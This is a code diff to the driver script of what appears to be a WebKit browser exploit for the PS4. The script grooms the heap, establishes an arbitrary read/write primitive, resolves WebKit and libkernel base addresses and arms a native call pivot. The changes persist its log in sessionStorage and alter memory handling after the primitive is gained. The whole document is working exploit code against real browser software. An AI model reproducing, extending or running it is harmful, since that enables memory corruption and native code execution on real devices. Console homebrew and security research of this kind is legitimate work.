@@ -4,14 +4,9 @@ import { installWindowP, pairStatus } from "./mem.js";
 import { groomBootLine, wireGroomBar } from "./groom_presets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250827g";
-/** promote real pair after primitive — frees ~96MB 12M carrier (chain_poops ?pair=1) */
-const PROMOTE_PAIR = params.get("promote") !== "0";
-/** alloc-pressure sweep OOMs on PS4 — off by default; opt-in with ?sweep=3 */
-const SWEEP_CYCLES = params.has("sweep") ? parseInt(params.get("sweep"), 10) : 0;
-const SWEEP_MB = params.has("sweepmb") ? parseInt(params.get("sweepmb"), 10) : 2;
-const SWEEP_MS = params.has("sweepms") ? parseInt(params.get("sweepms"), 10) : 80;
-const SETTLE_MS = params.has("settle") ? parseInt(params.get("settle"), 10) : 250;
+const BUILD_ID = "rw-20250827i";
+/** opt-in only — release triggers JSC GC; chain_poops uses ?pair=1 (default off) */
+const PROMOTE_PAIR = params.get("promote") === "1";
 /** Skip heavy pointer map on Start unless ?rwproof=1 (saves memory for native call) */
 const SKIP_RW_PROOF = params.get("rwproof") !== "1";
 /** lite Start runs getpid inline unless ?native=0 */
@@ -40,6 +35,10 @@ let raceAttempt = 0;
 let lengthMissStreak = 0;
 
 const LOG_MAX = 300;
+const PERSIST_MAX = 150;
+const SS_LOG = "wk-rw-log";
+const SS_STATE = "wk-rw-state";
+const SS_LOG_BUILD = "wk-rw-log-build";
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
@@ -50,20 +49,77 @@ let nativeAllowed = false;
 
 function $(id) { return document.getElementById(id); }
 
+function renderOut() {
+    if (!outEl) return;
+    outEl.textContent = lines.join("\n");
+    outEl.scrollTop = outEl.scrollHeight;
+}
+
+function persistLine(line) {
+    try {
+        const arr = (sessionStorage.getItem(SS_LOG) || "").split("\n").filter(Boolean);
+        arr.push(line);
+        while (arr.length > PERSIST_MAX) arr.shift();
+        sessionStorage.setItem(SS_LOG, arr.join("\n"));
+        sessionStorage.setItem(SS_LOG_BUILD, BUILD_ID);
+    } catch (_) { }
+}
+
+function persistState(msg, cls) {
+    try {
+        sessionStorage.setItem(SS_STATE, JSON.stringify({
+            msg: msg || "",
+            cls: cls || "",
+            build: BUILD_ID,
+            t: Date.now(),
+        }));
+    } catch (_) { }
+}
+
+function clearPersistedLog() {
+    try {
+        sessionStorage.removeItem(SS_LOG);
+        sessionStorage.removeItem(SS_STATE);
+        sessionStorage.removeItem(SS_LOG_BUILD);
+    } catch (_) { }
+}
+
+function restorePersistedLog() {
+    try {
+        const prev = sessionStorage.getItem(SS_LOG);
+        if (!prev) return false;
+        const build = sessionStorage.getItem(SS_LOG_BUILD) || "?";
+        const st = sessionStorage.getItem(SS_STATE);
+        lines.push("=== RESTORED (prev build=" + build + ") ===");
+        for (const l of prev.split("\n")) {
+            if (l) lines.push(l);
+        }
+        lines.push("=== RELOAD build=" + BUILD_ID + " ===");
+        if (st) {
+            try {
+                const j = JSON.parse(st);
+                if (j.msg) lines.push("LAST-STATE  " + j.msg);
+            } catch (_) { }
+        }
+        return true;
+    } catch (_) {
+        return false;
+    }
+}
+
 function mark(tag, detail) {
     const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
     lines.push(line);
     if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
-    if (outEl) {
-        outEl.textContent = lines.join("\n");
-        outEl.scrollTop = outEl.scrollHeight;
-    }
+    persistLine(line);
+    renderOut();
 }
 
 function state(msg, cls) {
     if (!stateEl) return;
     stateEl.textContent = msg;
     stateEl.className = cls || "";
+    persistState(msg, cls);
 }
 
 function setUi() {
@@ -401,83 +457,14 @@ function resolveWebkitBase(off, nativeFn) {
     return null;
 }
 
-async function yieldAfterPromote() {
-    if (!pairStatus.promoted) {
-        mark("YIELD-SKIP", "promoted=" + pairStatus.promoted);
-        return;
-    }
-    if (SWEEP_CYCLES > 0) {
-        mark("SWEEP", "opt-in alloc cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB);
-        state("sweep (opt-in)…", "warn");
-        const t0 = Date.now();
-        for (let i = 0; i < SWEEP_CYCLES; i++) {
-            let junk = [];
-            for (let k = 0; k < SWEEP_MB; k++)
-                junk.push(new ArrayBuffer(0x100000));
-            junk.length = 0;
-            junk = null;
-            await new Promise(r => setTimeout(r, SWEEP_MS));
-        }
-        mark("SWEEP-DONE", "total_ms=" + (Date.now() - t0));
-        return;
-    }
-    mark("YIELD", "settle_ms=" + SETTLE_MS + " (no alloc — sweep OOMs on PS4)");
-    await new Promise(r => setTimeout(r, SETTLE_MS));
-}
-
-async function freeAfterPrimitive() {
-    retained.length = 0;
-    if (lines.length > 4) {
-        lines.splice(0, lines.length - 4);
-        if (outEl) outEl.textContent = lines.join("\n");
-    }
-    try {
-        if (!exploit) {
-            const core = await import("./core.js");
-            exploit = {
-                establishPrimitive: core.establishPrimitive,
-                installWindowP,
-                trimExploitDebris: core.trimExploitDebris,
-            };
-        }
-        if (exploit.trimExploitDebris)
-            exploit.trimExploitDebris();
-    } catch (_) { }
-    await new Promise(r => setTimeout(r, 128));
-}
-
-async function freeBeforeNative() {
-    stripUiForNative();
-    retained.length = 0;
-    pointers.length = 0;
-    lines.length = 0;
-    if (outEl) outEl.textContent = "";
-    if (trimDebrisFn) {
-        try { trimDebrisFn(); } catch (_) { }
-    }
-    exploit = null;
-    await new Promise(r => setTimeout(r, 500));
-}
-
-function seedNativeSession(p, off) {
-    const fn = captureNativeFnQuick(p, off);
-    if (fn) {
-        try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
-        const base = resolveWebkitBase(off, fn);
-        if (base) try { sessionStorage.setItem("wk-webkitBase", String(base)); } catch (_) { }
-    }
-    return fn;
-}
-
-async function doNativeCall(fromStart) {
+function doNativeCallImmediate() {
     if (!nativeAllowed) {
-        mark("NATIVE-FAIL", "pair not promoted — close browser, reload, Start");
-        state("promote failed — native blocked", "bad");
+        mark("NATIVE-FAIL", "window.p broken — reload");
+        state("native blocked", "bad");
         return;
     }
     const p = window.p;
     if (!p) throw new Error("window.p missing");
-    if (!fromStart) await freeBeforeNative();
 
     const off = loadEffectiveOff();
     const nativeFn = captureNativeFnQuick(p, off);
@@ -492,7 +479,8 @@ async function doNativeCall(fromStart) {
         nativeChain.disarm();
         nativeChain = null;
     }
-    mark("NATIVE-SETUP", "base=" + webkitBase + " lk=" + libkernelBase);
+    mark("NATIVE-SETUP", "base=" + webkitBase + " lk=" + libkernelBase
+        + " promoted=" + pairStatus.promoted);
     const chain = armNativePivot(p, off, webkitBase, libkernelBase);
     nativeChain = chain;
     try {
@@ -509,12 +497,34 @@ async function doNativeCall(fromStart) {
     }
 }
 
+async function freeBeforeNative() {
+    stripUiForNative();
+    retained.length = 0;
+    pointers.length = 0;
+    mark("NATIVE-PREP", "ui trimmed — log kept in sessionStorage");
+    if (trimDebrisFn) {
+        try { trimDebrisFn(); } catch (_) { }
+    }
+    exploit = null;
+}
+
+function seedNativeSession(p, off) {
+    const fn = captureNativeFnQuick(p, off);
+    if (fn) {
+        try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
+        const base = resolveWebkitBase(off, fn);
+        if (base) try { sessionStorage.setItem("wk-webkitBase", String(base)); } catch (_) { }
+    }
+    return fn;
+}
+
 async function runNativeCall() {
     if (busy || !ready || !window.p) return;
     busy = true;
     setUi();
     try {
-        await doNativeCall();
+        await freeBeforeNative();
+        doNativeCallImmediate();
     } catch (err) {
         if (nativeChain) {
             try { nativeChain.disarm(); } catch (_) { }
@@ -648,7 +658,7 @@ async function runStart() {
     if (busy || ready) return;
     busy = true;
     setUi();
-    lines.length = 0;
+    mark("RUN-START", "build=" + BUILD_ID);
     pointers.length = 0;
     renderMap();
 
@@ -672,34 +682,25 @@ async function runStart() {
         installP(carrier, {
             promote: PROMOTE_PAIR,
             onEvent: (t, d) => {
-                if (/PAIR|TRIM|RELEASE|SWEEP|FAIL|ERROR/i.test(t))
+                if (/PAIR|TRIM|RELEASE|FAIL|ERROR/i.test(t))
                     mark(t, d || "");
             },
         });
         const p = window.p;
         if (!p) throw new Error("window.p missing");
 
+        nativeAllowed = pairStatus.state !== "broken";
         mark("PRIMITIVE-OK", "arb rw live");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
 
-        await freeAfterPrimitive();
-        await yieldAfterPromote();
-
-        nativeAllowed = !!pairStatus.promoted;
-        if (PROMOTE_PAIR && !pairStatus.promoted) {
-            mark("PROMOTE-FAIL", pairStatus.error || pairStatus.state || "unknown");
-        }
-
         const off = loadEffectiveOff();
         if (SKIP_RW_PROOF) {
-            if (!AUTO_NATIVE) seedNativeSession(p, off);
-            mark("START-LITE", "rw proof skipped"
-                + (AUTO_NATIVE ? " — auto native" : " (add ?native=0 to defer)"));
+            mark("START-LITE", "auto-native=" + AUTO_NATIVE
+                + " promote=" + PROMOTE_PAIR);
             ready = true;
-            if (nativeAllowed && AUTO_NATIVE) {
-                state("calling getpid…", "warn");
-                try { await doNativeCall(true); }
+            if (AUTO_NATIVE && nativeAllowed) {
+                try { doNativeCallImmediate(); }
                 catch (err) {
                     if (nativeChain) {
                         try { nativeChain.disarm(); } catch (_) { }
@@ -709,13 +710,12 @@ async function runStart() {
                     state("native call failed", "bad");
                 }
             } else if (!nativeAllowed) {
-                state("promote failed — native blocked", "bad");
+                state("pair broken — reload", "bad");
             } else {
                 state("primitive OK — tap Native call", "ok");
             }
         } else {
             seedNativeSession(p, off);
-            nativeAllowed = !!pairStatus.promoted;
             const ok = await runRwProof(p, off);
             ready = true;
             if (ok) {
@@ -784,7 +784,9 @@ function init() {
     wireClick(btnNative, function () { return runNativeCall(); });
     wireClick(btnClear, function () {
         lines.length = 0;
+        clearPersistedLog();
         if (outEl) outEl.textContent = "";
+        mark("LOG-CLEAR", "sessionStorage log cleared");
     });
     wireClick(btnPeek, function () {
         const a = parseAddr(addrIn.value);
@@ -800,11 +802,16 @@ function init() {
         });
     }
 
-    mark("BOOT", "build=" + BUILD_ID + " — inline native pivot (no import)");
-    mark("BOOT", "auto-native=" + AUTO_NATIVE + " promote=" + PROMOTE_PAIR);
+    if (params.get("clearlog") === "1") clearPersistedLog();
+    else if (restorePersistedLog()) renderOut();
+
+    mark("BOOT", "build=" + BUILD_ID + " — getpid inline, zero delay after primitive");
+    mark("BOOT", "log persists in sessionStorage (survives OOM reload)");
+    mark("BOOT", "promote=" + PROMOTE_PAIR + " (opt-in ?promote=1) auto-native=" + AUTO_NATIVE);
     mark("BOOT", groomBootLine(params));
     mark("BOOT", "one establishPrimitive run — internal auto-retry until win");
     window.addEventListener("beforeunload", function () {
+        if (stateEl) persistState(stateEl.textContent, stateEl.className);
         if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
     });
     wireGroomBar(() => busy);
